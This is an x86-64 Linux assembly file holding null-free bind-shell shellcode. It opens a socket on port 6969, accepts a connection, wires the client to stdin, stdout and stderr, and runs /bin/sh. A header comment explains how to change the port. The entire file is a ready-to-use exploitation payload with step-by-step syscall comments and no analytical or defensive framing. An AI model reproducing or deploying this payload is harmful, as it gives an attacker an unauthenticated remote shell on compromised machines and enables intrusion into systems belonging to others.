; non-NULL shellcode running /bin/sh and listening on port 6969
; -> change the port using Python:
;   $ python -c "import socket; print(hex(socket.htons(PORT)))"
global _start
section .text

_start:
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int sock = socket(AF_INET, SOCK_STREAM, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x29
  pop  rax       ; rax = socket system call number
  push byte 0x2
  pop  rdi       ; rdi = AF_INET
  push byte 0x1
  pop  rsi       ; rsi = SOCK_STREAM
  xor  rdx, rdx  ; rdx = 0
  syscall
  xchg rdi, rax  ; store file descriptor in rdi 
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; struct sockaddr_in address
  ; address.sin_family = AF_INET
  ; address.sin_port = htons(PORT)
  ; address.sin_addr.s_addr = INADDR_ANY
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push rdx
  push rdx                    ; create 16 byte 0 buffer on stack
  mov  byte [rsp], 0x2        ; store AF_INET at address.sin_family
  mov  word [rsp + 2], 0x391b ; store PORT at address.sin_port
  mov  rsi, rsp               ; rsi = &address on the stack
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; bind(sock, (struct sockaddr *)&address, sizeof(address))
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x31
  pop  rax       ; rax = bind system call number
  push byte 0x10
  pop  rdx       ; rdx = sizeof(struct sockaddr_in)
  syscall        ; rdi = socket file descriptor and rsi = &(address)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; listen(sock, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x32
  pop  rax       ; rax = listen system call number
  xor  rsi, rsi  ; rsi = 0
  syscall        ; rdi still holds socket file descriptor
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int new_sock = accept(sock, NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor  dl, dl    ; zero rdx
  push byte 0x2b
  pop  rax       ; rax = accept system call number
  syscall        ; rsi = 0 still
  xchg rdi, rax  ; store client socket (new_sock) in rdi
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; dup(new_sock, 0)
  ; dup(new_sock, 1)
  ; dup(new_sock, 2)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push byte 0x2
  pop  rsi       ; rsi = STDERR file descriptor number
dup:
  push byte 0x21
  pop  rax       ; rax = dup2 systemcall number
  syscall        ; rdi still holds client socket file descriptor
  dec  rsi       ; cycle through STDIN and STDOUT descriptors
  jns dup
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; execve("/bin/sh", NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor  rsi, rsi                ; rsi = 0
  xor  rdx, rdx                ; rdx = 0
  push rdx
  mov  rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse order
  push rbx
  mov  rdi, rsp                ; set rdi = address of string on stack
  push byte 0x3b
  pop  rax                     ; rax = execve system call number
  syscall




